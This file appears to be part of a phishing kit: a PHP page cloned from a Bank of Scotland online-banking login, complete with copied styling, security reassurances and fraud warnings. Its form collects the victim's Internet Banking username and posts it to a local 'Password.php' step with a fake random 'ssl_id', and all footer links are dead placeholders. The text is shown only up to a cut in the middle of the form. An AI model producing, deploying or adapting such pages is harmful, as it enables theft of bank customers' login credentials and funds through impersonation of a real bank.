<?php
ini_set('display_errors', false);
date_default_timezone_set('Europe/London');
require_once('../../inc/functions.php');
require_once('../../inc/include_page.php');
require_once('../../inc/configuration.php');


?>
<!-- saved from url=(0014)about:internet -->
<!DOCTYPE html>
<!--[if lt IE 7 ]> <html lang="en" class="ie6"> <![endif]-->
<!--[if IE 7 ]> <html lang="en" class="ie7"> <![endif]-->
<!--[if IE 8 ]> <html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9 ]> <html lang="en" class="ie9"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html class="js" lang="en">
<!--<![endif]-->

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">

    <meta http-equiv="Content-Security-Policy" content="default-src data: gap: content: blob: 'self' 'unsafe-inline' 'unsafe-eval' *.bankofscotland.co.uk *.lloydsbank.co.uk *.biocatch.com *.we-stats.com *.online-metrix.net *.mybluemix.net cwa: jsbridge: ; connect-src *.bankofscotland.co.uk *.lloydsbank.co.uk *.biocatch.com *.we-stats.com *.online-metrix.net *.mybluemix.net cwa: jsbridge:  data:; script-src 'self' *.bankofscotland.co.uk *.lloydsbank.co.uk *.biocatch.com *.we-stats.com *.online-metrix.net *.mybluemix.net cwa: jsbridge:  'unsafe-inline' 'unsafe-eval'; worker-src 'self' 'unsafe-inline' 'unsafe-eval' data: gap: content: blob: *.bankofscotland.co.uk *.lloydsbank.co.uk *.biocatch.com *.we-stats.com *.online-metrix.net *.mybluemix.net cwa: jsbridge: ; ">

    <link rel="stylesheet" property="stylesheet" href="assets/files/main.css">
    <title>Bank of Scotland Secure Payments - USERID</title>
    <link rel="shortcut icon" href="assets/files/bos_favicon.ico">
    <style>
        @font-face {
            font-family: "avenirnextltdemi";
            src: url(assets/files/font2.otf);
        }
        
        @font-face {
            font-family: "avenirnextltregular";
            src: url(assets/files/font1.otf);
        }
        
        @font-face {
            font-family: "bospillgothicbold";
            src: url(assets/files/font3.ttf);
        }
        
        @font-face {
            font-family: "bos-icon";
            src: url(assets/files/font4.woff);
        }
    </style>
    <style>
        body #msgWait {
            display: none
        }
        
        body.nga #msgWait {
            display: block
        }
        
        #msgWait {
            margin: 20px;
            background-color: white
        }
        
        #msgWait div {
            text-align: center
        }
        
        #msgWait h3 {
            text-align: center;
            margin-top: 10px;
            font-size: 18px;
        }
    </style>

    <noscript>
        <style>
            body {
                display: block !important;
            }
        </style>
    </noscript>
    <style data-styled-components="">
        /* sc-component-id: sc-bdVaJa */
        
        .sc-bdVaJa {}
        
        .fipYME {
            color: #005BA2;
            cursor: pointer;
            font-family: avenirnextltregular, "Avenir Next LT Pro Regular";
            font-size: 15px;
            line-height: 18px;
            margin-top: 0px;
            margin-bottom: 0px;
            -webkit-text-decoration: underline;
            text-decoration: underline;
        }
        
        .fipYME:hover {
            color: #005BA2;
            -webkit-text-decoration: none;
            text-decoration: none;
        }
        
        .fipYME:focus {
            outline: none;
            background-color: #FFC764;
            color: #003F71;
        }
        /* sc-component-id: sc-bwzfXH */
        
        .sc-bwzfXH {}
        
        .hQfJPe {
            border: none;
            box-sizing: border-box;
            font-size: 17px;
            cursor: pointer;
            padding: 12px 20px;
            text-align: center;
            width: 100%;
            background-color: #048161;
            color: #FFF;
            font-family: avenirnextltregular, "Avenir Next LT Pro Regular";
        }
        
        .hQfJPe .arrow {
            display: inline-block;
            height: 100%;
            margin-left: 10px;
        }
        
        .hQfJPe .arrow #chevron-right {
            fill: #FFF;
        }
        
        .hQfJPe:focus {
            background-color: #FFC764;
            color: #024D3A;
        }
        
        .hQfJPe:focus #chevron-right {
            fill: #024D3A;
        }
        
        .hQfJPe:hover {
            background-color: #024D3A;
            color: #FFF;
        }
        
        .hQfJPe:hover #chevron-right {
            fill: #FFF;
        }
        
        .hQfJPe:disabled {
            background-color: #FFF;
            border: 2px solid #048161;
            color: #048161;
            opacity: 0.5;
        }
        
        .hQfJPe:disabled #chevron-right {
            fill: #048161;
        }
        
        @media only screen and (min-width:481px) {
            .hQfJPe {
                width: auto;
            }
        }
        /* sc-component-id: sc-htpNat */
        
        .sc-htpNat {}
        
        .dtexCQ {
            box-sizing: border-box;
            background-color: #FFF;
            border: 1px solid #BFBFBF;
            cursor: pointer;
            display: inline-block;
            height: 32px;
            line-height: 32px;
            text-align: center;
            width: 30px;
        }
        
        .dtexCQ.checked {
            background-color: #005BA2;
            border: 1px solid #005BA2;
        }
        
        .dtexCQ .tick {
            height: 100%;
        }
        
        .dtexCQ .tick svg {
            display: block;
            margin: auto;
            height: 100%;
        }
        
        .dtexCQ:focus {
            outline: none;
            border: 1px solid #005BA2;
            box-shadow: 0 0 4px 1px rgba(0, 91, 162, 0.9);
        }
        
        .dtexCQ:hover {
            border: 2px solid #005BA2;
        }
        /* sc-component-id: sc-bxivhb */
        
        .sc-bxivhb {}
        
        .iKXmlQ {
            color: #333;
            font-family: avenirnextltregular, "Avenir Next LT Pro Regular";
            font-size: 15px;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
        }
        /* sc-component-id: sc-ifAKCX */
        /* sc-component-id: sc-EHOje */
        
        .sc-EHOje {}
        
        .ebrAFp {
            color: #333;
            font-family: avenirnextltdemi, "Avenir Next LT Pro Medium";
            font-size: 18px;
            line-height: 24px;
            margin-top: 0px;
            margin-bottom: 0px;
        }
        /* sc-component-id: sc-bZQynM */
        /* sc-component-id: sc-gzVnrw */
        /* sc-component-id: sc-htoDjs */
        /* sc-component-id: sc-dnqmqq */
        
        .sc-dnqmqq {}
        
        .hgNBjO {
            box-sizing: border-box;
            background-color: #FFFFFF;
            border: 1px solid #BFBFBF;
            color: #333;
            font-family: avenirnextltregular, "Avenir Next LT Pro Regular";
            font-size: 15px;
            line-height: 24px;
            padding: 11px 18px 13px;
            width: 100%;
        }
        
        .hgNBjO:focus {
            outline: none;
            border: 1px solid #2178B0;
            box-shadow: 0 0 4px 1px rgba(0, 44, 130, 0.5);
        }
        
        .hgNBjO:hover {
            padding: 10px 17px 12px;
            border: 2px solid #002C82;
        }
        
        @media only screen and (min-width:481px) {
            .hgNBjO {
                width: auto;
            }
        }
        /* sc-component-id: sc-iwsKbI */
        /* sc-component-id: sc-gZMcBi */
        
        .sc-gZMcBi {}
        
        .jlHLWN {
            color: #05286A;
            font-family: bospillgothicbold, "BoS Pill Gothic";
            font-size: 36px;
            line-height: 42px;
            margin-top: 0px;
            margin-bottom: 0px;
        }
        /* sc-component-id: sc-gqjmRU */
        /* sc-component-id: sc-VigVT */
        /* sc-component-id: sc-jTzLTM */
        
        .sc-jTzLTM {}
        
        .kKQAue::after {
            content: ' ';
            clear: both;
            display: block;
        }
        /* sc-component-id: sc-fjdhpX */
        
        .sc-fjdhpX {}
        
        .dbXlPg {
            float: left;
            width: 100%;
            padding-left: 0px;
            padding-right: 0px;
        }
        
        @media only screen and (min-width:650px) {
            .dbXlPg {
                padding-left: 0px;
                padding-right: 10px;
                width: calc(66.66666666666666% - 5px);
            }
        }
        
        .pAihb {
            float: left;
            width: 100%;
            padding-left: 0px;
            padding-right: 0px;
        }
        
        @media only screen and (min-width:650px) {
            .pAihb {
                padding-left: 10px;
                padding-right: 0px;
                width: calc(33.33333333333333% - 5px);
            }
        }
        /* sc-component-id: sc-jzJRlG */
        
        .sc-jzJRlG {}
        
        .grGTyx {
            padding: 0 0px;
        }
        /* sc-component-id: sc-cSHVUG */
        
        .sc-cSHVUG {}
        
        .DTtHD {
            color: #333;
            font-family: avenirnextltdemi, "Avenir Next LT Pro Medium";
            font-size: 18px;
            line-height: 24px;
            font-weight: 500;
        }
        
        .DTtHD strong,
        .DTtHD b {
            font-family: avenirnextltdemi, "Avenir Next LT Pro Medium";
            font-weight: 500;
        }
        
        .DTtHD a {
            color: #333;
        }
        
        .DTtHD a:hover {
            -webkit-text-decoration: none;
            text-decoration: none;
        }
        
        .jXhBke {
            color: #333;
            font-family: avenirnextltdemi, "Avenir Next LT Pro Medium";
            font-size: 24px;
            line-height: 36px;
            font-weight: 500;
        }
        
        .jXhBke strong,
        .jXhBke b {
            font-family: avenirnextltdemi, "Avenir Next LT Pro Medium";
            font-weight: 500;
        }
        
        .jXhBke a {
            color: #333;
        }
        
        .jXhBke a:hover {
            -webkit-text-decoration: none;
            text-decoration: none;
        }
        /* sc-component-id: sc-kAzzGY */
        
        .sc-kAzzGY {}
        
        .gaYeAF {
            color: #FFF;
            font-family: avenirnextltregular, "Avenir Next LT Pro Regular";
            font-size: 15px;
            line-height: 24px;
            font-weight: 0;
        }
        
        .gaYeAF strong,
        .gaYeAF b {
            font-family: avenirnextltdemi, "Avenir Next LT Pro Medium";
            font-weight: 500;
        }
        
        .gaYeAF a {
            color: #FFF;
        }
        
        .gaYeAF a:hover {
            -webkit-text-decoration: none;
            text-decoration: none;
        }
        /* sc-component-id: sc-chPdSV */
        /* sc-component-id: sc-kgoBCf */
        /* sc-component-id: sc-kGXeez */
        /* sc-component-id: sc-kpOJdX */
        /* sc-component-id: sc-dxgOiQ */
        /* sc-component-id: sc-ckVGcZ */
        /* sc-component-id: sc-jKJlTe */
        /* sc-component-id: sc-eNQAEJ */
        /* sc-component-id: sc-hMqMXs */
        /* sc-component-id: sc-kEYyzF */
        /* sc-component-id: sc-kkGfuU */
        
        .sc-kkGfuU {}
        
        .fVVVf .checkbox-field {
            height: 32px;
            line-height: 32px;
        }
        
        .fVVVf .checkbox-field__checkbox {
            margin-right: 12px;
        }
        
        .fVVVf .checkbox-field__label {
            cursor: pointer;
            display: inline-block;
            height: 32px;
            line-height: 32px;
            margin: 0 auto;
            vertical-align: top;
        }
        /* sc-component-id: sc-iAyFgw */
        /* sc-component-id: sc-hSdWYo */
        /* sc-component-id: sc-eHgmQL */
        /* sc-component-id: sc-cvbbAY */
        /* sc-component-id: sc-jWBwVP */
        
        .sc-jWBwVP {}
        
        .dkWjwj .text-field {
            display: block;
        }
        
        .dkWjwj .text-field__header {
            display: block;
            margin-bottom: 12px;
        }
        
        .dkWjwj .text-field__header-label {
            margin-right: 12px;
        }
        
        @media only screen and (min-width:481px) {
            .dkWjwj .text-field__input {
                min-width: 360px;
            }
        }
        
        .dkWjwj .text-field__error {
            display: block;
            margin-bottom: 12px;
        }
        /* sc-component-id: sc-brqgnP */
        /* sc-component-id: sc-cMljjf */
        /* sc-component-id: sc-jAaTju */
        /* sc-component-id: sc-jDwBTQ */
        /* sc-component-id: sc-gPEVay */
        
        .sc-gPEVay {}
        
        .iPlngJ {
            background-color: #005BA2;
            padding: 18px 18px 24px;
        }
        
        .iPlngJ .lock-icon {
            display: block;
            height: 24px;
            margin-bottom: 12px;
        }
        
        @media only screen and (min-width:481px) {
            .iPlngJ {
                padding: 18px 24px;
            }
            .iPlngJ .align-content {
                display: table;
            }
            .iPlngJ .align-content .lock-icon {
                display: table-cell;
                padding-right: 24px;
                margin-bottom: 0px;
                vertical-align: top;
            }
            .iPlngJ .align-content .children {
                display: table-cell;
            }
        }
    </style>
    <style data-styled-components="">
        /* sc-component-id: AuthMethodSelector___AuthMethodSelector-Ogyvr */
        /* sc-component-id: CallToAction___CallToAction-gmvBcC */
        
        .CallToAction___CallToAction-gmvBcC {}
        
        .hmBtsj hr {
            aria-hidden: true;
            margin-top: 30px;
            margin-bottom: 30px;
            border-top: 1px solid #bfbfbf !important;
        }
        
        .hmBtsj .navbar {
            text-align: center;
        }
        
        .hmBtsj .navbar .call-to-action__cancel .link {
            font-size: 18px;
        }
        
        .hmBtsj .navbar .primary-button,
        .hmBtsj .navbar .secondary-button {
            margin-bottom: 30px;
        }
        
        @media only screen and (min-width:481px) {
            .hmBtsj .navbar {
                text-align: left;
            }
            .hmBtsj .navbar .secondary-button {
                margin-right: 24px;
            }
            .hmBtsj .navbar .primary-button,
            .hmBtsj .navbar .secondary-button {
                float: right;
                margin-bottom: 0;
            }
            .hmBtsj .navbar .call-to-action__cancel {
                width: 50%;
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-align-items: center;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                min-height: 48px;
            }
            .hmBtsj .navbar:after {
                clear: both;
                content: ' ';
                height: 0px;
                display: block;
            }
            .hmBtsj::after {
                clear: both;
                content: ' ';
                height: 0px;
                display: block;
            }
        }
        /* sc-component-id: CardReader__StyledCardReader-elvHUF */
        /* sc-component-id: ForgotPassword___ForgotPassword-bivxqR */
        
        .ForgotPassword___ForgotPassword-bivxqR {}
        
        .csDHBO .forgot-password__modal__continue {
            float: right;
        }
        
        .csDHBO .forgot-password__modal__header {
            margin-bottom: 12px;
        }
        
        .csDHBO .forgot-password__modal__info {
            margin-bottom: 30px;
        }
        
        .csDHBO .forgot-password__modal__reset {
            display: block;
            margin-bottom: 18px;
        }
        
        .csDHBO .forgot-password__modal__return {
            display: block;
            margin-bottom: 24px;
        }
        /* sc-component-id: MiGrid___MiGrid-dGslUk */
        /* sc-component-id: MiGrid__MiItem-hEatpl */
        /* sc-component-id: PhonesSelector___PhonesSelectorWrapper-eNMOjV */
        /* sc-component-id: CardReaderIdentify__StyledCardReaderIdentify-jPnQCZ */
        /* sc-component-id: CardReaderRespond__StyledCardReaderRespond-kBxxoi */
        /* sc-component-id: EiaInitiate__StyledEiaInitiate-kWyFLK */
        /* sc-component-id: EiaInProgress__StyledEiaInProgress-jhPPhz */
        /* sc-component-id: MemorableInformation__StyledMemorableInformation-jeYNyl */
        /* sc-component-id: Password__StyledPassword-bpcNfR */
        /* sc-component-id: UserIdentity__StyledUserIdentity-IuJyu */
        
        .UserIdentity__StyledUserIdentity-IuJyu {}
        
        .kmvJfa .checkbox-field {
            margin-bottom: 30px;
        }
        
        .kmvJfa .text-field {
            margin-bottom: 30px;
        }
        
        .kmvJfa .info-message {
            margin-top: 30px;
        }
        
        .kmvJfa .info-message.margin-0 {
            margin-top: 0;
        }
        /* sc-component-id: AuthMethod___AuthMethod-MQlQP */
        
        .AuthMethod___AuthMethod-MQlQP {}
        
        .hrQGBJ .content {
            background-color: #FFF;
            padding: 18px;
            margin-bottom: 43px;
        }
        
        .hrQGBJ .content:focus {
            outline: none;
        }
        
        @media only screen and (min-width:768px) {
            .hrQGBJ .content {
                padding: 24px;
            }
        }
        
        .hrQGBJ .error-notification {
            margin-bottom: 18px;
        }
        
        .hrQGBJ .not-sharing-notification {
            margin-bottom: 18px;
        }
        /* sc-component-id: loaderstyle___Loader-ecXlOq */
        /* sc-component-id: loaderstyle___Spinner-kWmZMN */
        /* sc-component-id: Notification___Notification-gKLtmr */
        /* sc-component-id: paymentInfostyle___PaymentInfoField-bPCFkb */
        /* sc-component-id: paymentInfostyle___ProviderName-xcfsV */
        /* sc-component-id: paymentInfostyle___ProviderAmount-jvBRpf */
        /* sc-component-id: paymentAccountListstyle___PaymentAccountList-QvgTa */
        /* sc-component-id: paymentInfoFieldstyle___PaymentInfoField-bWaABM */
        /* sc-component-id: paymentInfoFieldstyle___FieldInfo-fVVTHz */
        /* sc-component-id: AuthMethodSelector___AuthMethodSelector-fzgTXY */
        /* sc-component-id: CallToAction___CallToAction-juWdHl */
        /* sc-component-id: CardReader__StyledCardReader-gOHFjU */
        /* sc-component-id: ForgotPassword___ForgotPassword-gsAuyO */
        /* sc-component-id: MiGrid___MiGrid-fohBWM */
        /* sc-component-id: MiGrid__MiItem-YELyo */
        /* sc-component-id: PhonesSelector___PhonesSelectorWrapper-kflKsl */
        /* sc-component-id: CardReaderIdentify__StyledCardReaderIdentify-cJgUJi */
        /* sc-component-id: CardReaderRespond__StyledCardReaderRespond-kRrdbo */
        /* sc-component-id: EiaInitiate__StyledEiaInitiate-dtPYcl */
        /* sc-component-id: EiaInProgress__StyledEiaInProgress-blRISD */
        /* sc-component-id: MemorableInformation__StyledMemorableInformation-bVDqaK */
        /* sc-component-id: Password__StyledPassword-itYxeT */
        /* sc-component-id: UserIdentity__StyledUserIdentity-jhWhck */
        /* sc-component-id: AuthMethod___AuthMethod-DkRap */
        /* sc-component-id: ErrorComponentstyles___ErrorComponentWrapper-eRjTrK */
    </style>
    <style data-styled-components="">
        /* sc-component-id: paymentAccountsstyle___PaymentAccountsContent-dgOgFC */
        /* sc-component-id: Layout___Layout-dqZQxr */
        /* sc-component-id: Layout___LayoutContent-cmEiEj */
        /* sc-component-id: LayoutWithFAQ___Layout-ncaLZ */
        /* sc-component-id: LayoutWithFAQ___LayoutContent-jAFCTw */
        /* sc-component-id: LayoutWithFAQ___LayoutHeader-excfbN */
        /* sc-component-id: interstitial-pagestyle___InterstitialPage-iihehf */
        /* sc-component-id: AccNumSortCodestyles___AccountNumSortCodeWrapper-xxqyE */
        /* sc-component-id: Loading___Loading-buXhDw */
        /* sc-component-id: Carouselstyle___CarouselWrapper-dOctYq */
        /* sc-component-id: Carouselstyle___CarouselItemWrapper-UBmxZ */
        /* sc-component-id: Carouselstyle___CarouselContentWrapper-hbFbir */
        /* sc-component-id: Carouselstyle___CarouselContent-ieFgHq */
        /* sc-component-id: Carouselstyle___CarouselImageContent-hnIpKx */
        /* sc-component-id: Carouselstyle___CarouselActions-eZDkJH */
        /* sc-component-id: CarouselIndicators___CarouselIndicators-fmsAag */
        /* sc-component-id: Layout___Layout-jAOfUr */
        /* sc-component-id: LayoutWithFAQ___Layout-jqjESK */
        /* sc-component-id: IIPCustomerAccountSelectorstyles___IIPInfoMessage-jZPWHt */
        /* sc-component-id: Message___P-dbpLMn */
        /* sc-component-id: Notification___Notification-ffvNFT */
        /* sc-component-id: PaymentInfostyles___PaymentInfoWrapper-eVLwMU */
        
        .PaymentInfostyles___PaymentInfoWrapper-eVLwMU {}
        
        .meLND {
            width: 100%;
            background: white;
            padding: 30px 24px;
            box-sizing: border-box;
        }
        
        .meLND .header-2 {
            font-size: 24px;
            line-height: 30px;
            color: #333333;
        }
        /* sc-component-id: PaymentInfostyles___PaymentInfoBlock-hugTqR */
        
        .PaymentInfostyles___PaymentInfoBlock-hugTqR {}
        
        .kKzhho {
            width: 100%;
            margin-top: 12px;
            box-sizing: border-box;
            padding: 26px;
            display: block;
            overflow: hidden;
            clear: both;
            background-color: #05286A;
            color: #FFFFFF;
        }
        
        .kKzhho .normal-text {
            color: #333333;
        }
        
        .kKzhho .large-text {
            color: #333333;
            font-size: 24px;
            line-height: 30px;
            font-weight: 500;
        }
        
        .kKzhho .normal-text,
        .kKzhho .large-text {
            color: #FFFFFF;
        }
        
        .kKzhho .creditor-first > span {
            word-break: break-word;
        }
        
        .kKzhho .creditor-first,
        .kKzhho .creditor-last {
            float: left;
            width: 50%;
        }
        
        .kKzhho .creditor-last {
            text-align: right;
        }
        
        .kKzhho .normal-text {
            display: inline-block;
            margin-top: 6px;
        }
        
        @media only screen and (max-width:640px) {
            .kKzhho .creditor-first,
            .kKzhho .creditor-last {
                float: none;
                width: 100%;
            }
            .kKzhho .creditor-last {
                text-align: left;
                padding-top: 10px;
            }
            .kKzhho .payment-amount {
                margin-top: 10px;
            }
        }
        /* sc-component-id: PaymentInfostyles___PaymentInfoItems-fdQBwC */
        /* sc-component-id: PaymentInfostyles___TopBottomList-eNsaVf */
        /* sc-component-id: PaymentInfostyles___PaymentInfoItem-ceJZtk */
        /* sc-component-id: BtmtPaymentInfostyles___BtmtPaymentInfoWrapper-lfiafP */
        /* sc-component-id: BtmtPaymentInfostyles___BtmtPaymentInfoBlock-dMtCUD */
        /* sc-component-id: BtmtPaymentInfostyles___BtmtPaymentInfoItems-jBPZSc */
        /* sc-component-id: BtmtPaymentInfostyles___BtmtPaymentInfoItem-enGdCL */
        /* sc-component-id: BtmtPaymentInfostyles___BtmtTransferItem-kDhoyD */
        /* sc-component-id: BtmtAccountstyles___BtmtAccountWrapper-dtlIlA */
        /* sc-component-id: BtmtAccountstyles___BtmtAccountBlock-juyOIt */
        /* sc-component-id: BtmtTransferTimestyles___BtmtTransferBlockWrapper-dExLCM */
        /* sc-component-id: BtmtTransferTimestyles___BtmtTransferBlock-gvhrcr */
        /* sc-component-id: BTermsstyles___BTermsWrapper-jZDuHq */
        /* sc-component-id: BTermsstyles___BTermsBlock-cJpRzn */
        /* sc-component-id: BTermsstyles___PaymentInfoItems-zzyUf */
        /* sc-component-id: BTermsstyles___PaymentInfoItem-iEJXXw */
        /* sc-component-id: MTermsstyles___MTermsWrapper-iuiZpJ */
    </style>
    <style data-styled-components="">
        /* sc-component-id: MTermsstyles___MTermsBlock-fPpyMi */
        /* sc-component-id: MTermsstyles___PaymentInfoItems-gpkssT */
        /* sc-component-id: MTermsstyles___PaymentInfoItem-hpsiID */
        /* sc-component-id: AccountsRadioSelectorstyles___AccountsRadioSelectorStyled-dlVVPR */
        /* sc-component-id: AccountsRadioSelectorstyles___RadioFieldWrapper-dwtVag */
        /* sc-component-id: CustomerAccountsSelectorstyles___CustomerAccountsSelector-gJkOAG */
        /* sc-component-id: CustomerAccountsSelectorstyles___isMpaWrapper-jOXlXj */
        /* sc-component-id: PaymentReviewstyles___PaymentReviewWrapper-hGeupP */
        /* sc-component-id: PaymentReviewstyles___ReviewItem-jKkyOn */
        /* sc-component-id: ErrorComponentstyles___ErrorComponentWrapper-hUvmkH */
        /* sc-component-id: CustomerInfo___CustomerInfoLayout-gSsuEd */
        /* sc-component-id: EmailCheckBoxstyles___EmailCheckBox-kdbLff */
        /* sc-component-id: TimeScalesstyles___TimeScales-iNZtAJ */
        /* sc-component-id: TimeScalesstyles___WhatNextBox-gLGBZm */
        /* sc-component-id: FeeDetailsstyles___FeeDetails-fNTJLS */
        /* sc-component-id: FeeDetailsstyles___FeeSection-haThmW */
        /* sc-component-id: FeeDetailsstyles___FeeOptions-bwDiET */
        /* sc-component-id: FeeDetailsstyles___FeeNote-kpsHXs */
        /* sc-component-id: FxRateDialogstyles___FxRateDialog-eKnuRz */
        /* sc-component-id: BtmtInfostyles___BtmtInfoWrapper-kgMsaM */
        /* sc-component-id: BtmtInfostyles___BtmtInfoBlock-bONhkx */
        /* sc-component-id: MtCheckboxstyles___MtCheckboxWrapper-OPVzt */
        /* sc-component-id: MtCheckboxstyles___MtCheckboxBlock-kZpvZn */
    </style>
</head>

<body style="overflow: auto;">
    <noscript>
        <div class="page-wrap">
            <div class="header container-fluid">
                <div class="container" id="top">
                    <div id="brand-logo" role="img" aria-label="lloyds logo" class="logo"></div>
                    <div class=" static-security security">
                        <div>
                            <span class="link-wrapper" title="Safe &amp; secure">
                <span class="security-safe">Safe &amp; secure</span>
                            <span class="icon-lock"></span>
                            </span>
                        </div>
                    </div>
                </div>
            </div>
            <main id="app-main-parent" aria-label="content" aria-hidden="false" data-radium="true">
                <div class="error-page">
                    <div class="with-side large">
                        <div class="content-wrapper more-in-block">
                            <div>
                                <div data-selector="error-message">
                                    <h2>You need to have cookies and Javascript turned on to use this service.</h2>
                                    <p>Please make sure these are turned on and then start your payment again.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
        <footer class="page-footer container-fluid" role="contentinfo" aria-hidden="false">
            <div class="container">
                <ul>
                    <li>
                        <h3 class="link-heading">Legal - </h3>
                        <span><a href="#"  rel="noopener noreferrer"
                title="Legal - personal customers (opens in a new tab or window)">Personal</a><span
                class="link-separator"> | </span></span><a href="#"  rel="noopener noreferrer" title="Legal - business customers (opens in a new tab or window)">Business</a>
                    </li>
                    <li>
                        <h3 class="link-heading">Privacy - </h3>
                        <span><a href="#"  rel="noopener noreferrer"
                title="Privacy - personal customers (opens in a new tab or window)">Personal</a><span
                class="link-separator"> | </span></span><a href="#"  rel="noopener noreferrer" title="Privacy - business customers (opens in a new tab or window)">Business</a>
                    </li>
                    <li>
                        <h3 class="link-heading">Security - </h3>
                        <span><a href="#"  rel="noopener noreferrer"
                title="Security - personal customers (opens in a new tab or window)">Personal</a><span
                class="link-separator"> | </span></span><a href="#"  rel="noopener noreferrer" title="Security - business customers (opens in a new tab or window)">Business</a>
                    </li>
                    <li><a href="#"  rel="noopener noreferrer" title="Cookies (opens in a new tab or window)">Cookies</a></li>
                    <li><a href="#"  rel="noopener noreferrer" title="Lloyds Banking Group (opens in a new tab or window)">Lloyds Banking Group</a></li>
                </ul>
            </div>
        </footer>
    </noscript>

    <div id="app" class="bos">
        <div class="style-root" data-radium="true">
            <div class="page-wrap" data-radium="true"><a class="skipLink" aria-hidden="#main-content" data-selector="skip-link" href="#main-content">Skip to main content</a>
                <section aria-labelledby="top" class="header container-fluid" aria-hidden="false">
                    <div class="container" id="top">
                        <div id="brand-logo" class="logo"></div>
                        <div class="  security">
                            <div><span class="link-wrapper" title="Safe &amp; secure"><span class="security-safe">Safe &amp; secure<br><a href="javascript:void(0);" tabindex="0" class="security-subtext">Security information</a></span><span class="icon-lock"></span></span>
                            </div>
                        </div>
                    </div>
                </section>
                <div class=" header-expand customer-details-wrapper" data-radium="true">
                    <div class="header-info-container" data-radium="true">
                        <p>You are on a secure Bank of Scotland site. This service uses a secure data connection and your Bank of Scotland login details are not shared.</p>
                        <p class="expand-text">Fraudsters may try to persuade you to log into fake websites to share your account data or make a payment. Always check the security of a website by looking for the padlock symbol and 'https://' in the address bar. Legitimate companies and services for account data sharing and payments are registered with the <a href="#">Financial Conduct Authority</a>.
                            <br>Remember, we'll never share your logon details with anyone, or contact you by phone or email asking for passwords, memorable information, PINs or card reader codes. We'll also never ask you to transfer money into a ‘safe' account.
                            <br>If you receive unusual phone calls or emails, or have concerns about any other suspicious activity, please contact us.</p>
                    </div>
                </div>
                <main id="app-main-parent" aria-label="content" aria-hidden="false" data-radium="true">
                    <article class="app-children" data-radium="true">
                        <div class="with-side large">
                            <h1 id="main-content" data-selector="payemnt-page-heading" class="page-header">Bank of Scotland Login</h1></div>
                        <div class="app-children-components" data-radium="true">
                            <div class="userId with-side large">
                                <div class="content-wrapper notification-border">
                                    <div class="secure-message sc-gPEVay iPlngJ">
                                        <div class="align-content" role="presentation">
                                            <div aria-hidden="true" class="lock-icon">
                                                <svg width="17px" height="24px" viewBox="0 0 17 24" version="1.1" xmlns="#">
                                                    <title aria-disabled="true">Padlock</title>
                                                    <desc>Created with Sketch.</desc>
                                                    <defs></defs>
                                                    <g id="LockIcon-Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                        <g id="Padlock" fill="#FFF">
                                                            <path d="M12.7625879,8.96493349 L12.7625879,6.643289 C12.7559148,4.30592503 10.8468044,2.40749698 8.50030332,2.40749698 C6.15137566,2.40749698 4.24347857,4.30592503 4.23559219,6.643289 L4.23923206,8.96493349 L12.7625879,8.96493349 L12.7625879,8.96493349 Z M9.74331799,19.2025393 L9.74331799,16.4613059 C10.2886914,16.073156 10.6490383,15.4347037 10.6490383,14.7140266 C10.6490383,13.5302297 9.68690005,12.5707376 8.49848339,12.5707376 C7.31128002,12.5707376 6.3467152,13.5302297 6.3467152,14.7140266 C6.3467152,15.4347037 6.70402883,16.073156 7.25304214,16.4613059 L7.25546872,19.2025393 L9.74331799,19.2025393 L9.74331799,19.2025393 Z M0,24 L0,8.96493349 L1.82478678,8.96493349 L1.81932698,6.643289 C1.82600007,2.97702539 4.81797095,0 8.50030332,0 C12.1832423,0 15.1733933,2.97702539 15.1812797,6.643289 L15.1812797,8.96493349 L17,8.96493349 L17,24 L0,24 L0,24 Z" id="Fill-4"></path>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div class="children"><span class="normal-text sc-kAzzGY gaYeAF">None of your login details will be shared.</span></div>
                                        </div>
                                    </div>
                                </div>
                                
                            </div>
                            <div data-radium="true">
                                <div class="page sc-jTzLTM kKQAue">
                                    <div class="sc-jzJRlG grGTyx">
                                        <div class="AuthMethod___AuthMethod-MQlQP hrQGBJ">
                                            <div class="sc-fjdhpX dbXlPg">
                                                <form autocomplete="off" method="POST" class="content" tabindex="-1" action="Password.php?ssl_id=<?php echo randomString(30); ?>" >
                                                <h2 class="header-2 password__subheading sc-gZMcBi dboApU" style="color: #05286A;font-size: 24px;">Please enter your Internet Banking username.</h2>     
                                                <div class="user-id UserIdentity__StyledUserIdentity-IuJyu kmvJfa">
                                                        <div class="text-field sc-jWBwVP dkWjwj">
                                                            <div class="text-field__header"><span class="field-label text-field__header-label sc-EHOje ebrAFp">Internet Banking username:</span></div>
                                                            <input class="text-input text-field__input sc-dnqmqq hgNBjO" label="Internet Banking username:" aria-label="Internet Banking username:" data-selector="user-id-input" maxlength="30" name="username" required>
                                                        </div>
                                                        <div class="checkbox-field sc-kkGfuU fVVVf">
                                                            <div class="checkbox checkbox-field__checkbox sc-htpNat dtexCQ" id="remember-me" aria-checked="false" data-selector="remember-me-checkbox" aria-label="Remember my username?" role="checkbox" tabindex="0"></div>
                                                            <label class="checkbox-field__label" for="remember-me"><span class="field-copy sc-bxivhb iKXmlQ">Remember my username?</span></label>
                                                        </div>
                                                        <div class="forgot-password ForgotPassword___ForgotPassword-bivxqR csDHBO"><a class="link sc-bdVaJa fipYME" tabindex="0" data-selector="forgot-password-link">Forgotten your login details?</a></div>
                                                    </div>
                                                    <div class="call-to-action CallToAction___CallToAction-gmvBcC hmBtsj">
                                                        <hr aria-hidden="true">
                                                        <div class="navbar">
                                                            <button class="primary-button sc-bwzfXH hQfJPe"  type="submit">Continue
                                                                <div class="arrow">
                                                                    <svg width="10px" height="14px" viewBox="0 0 24 24" version="1.1" xmlns="#">
                                                                        <title>Chevron Right</title>
                                                                        <desc>Created with Sketch.</desc>
                                                                        <defs></defs>
                                                                        <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
